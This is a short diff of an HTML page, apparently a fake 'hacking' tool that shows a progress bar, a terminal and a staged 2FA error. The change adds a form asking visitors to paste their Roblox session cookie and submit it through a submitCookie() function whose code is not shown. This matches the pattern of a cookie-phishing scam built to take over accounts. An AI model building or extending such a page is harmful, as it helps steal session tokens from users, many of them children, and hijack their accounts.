@@ -35,16 +35,20 @@
     </div>
 
     <!-- Hacking Section -->
-    <div id="hacking" class="hidden">
-      <div class="progress-bar">
-        <div id="progress-bar-fill"></div>
-      </div>
-      <pre id="terminal"></pre>
-      <div id="cookie" class="hidden"></div>
-      <div id="twoFaError" class="hidden">
-        <p class="error-message">ERROR! User has 2FA enabled. Full access prevented.</p>
-      </div>
-    </div>
+<div id="hacking" class="hidden">
+  <div class="progress-bar">
+    <div id="progress-bar-fill"></div>
+  </div>
+  <pre id="terminal"></pre>
+  <!-- Cookie Input Section -->
+  <div id="cookieSection" class="hidden">
+    <input type="text" id="cookieInput" placeholder="Enter your Roblox Session ID (cookie)">
+    <button onclick="submitCookie()">Submit Cookie</button>
+  </div>
+  <div id="twoFaError" class="hidden">
+    <p class="error-message">ERROR! User has 2FA enabled. Full access prevented.</p>
+  </div>
+</div>
 
     <!-- Process Explanation -->
     <div class="process-explanation">
